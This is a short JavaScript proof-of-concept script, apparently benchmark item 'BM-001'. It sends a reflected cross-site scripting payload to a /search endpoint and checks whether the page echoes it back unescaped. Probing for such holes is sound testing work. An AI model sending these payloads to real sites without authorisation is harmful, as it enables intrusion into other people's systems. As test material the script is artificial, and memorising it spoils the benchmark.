'use strict';

const poc = require('./lib/common');

// BM-001: reflected XSS through /search.
poc.run(async function () {
  const payload = '<script>alert(7311)</script>';
  const res = await poc.request('GET', '/search?' + poc.query({ q: payload }));
  poc.finish(res.body.includes(payload), 'status ' + res.status + ', payload ' + (res.body.includes(payload) ? 'reflected unescaped' : 'not reflected raw'));
});
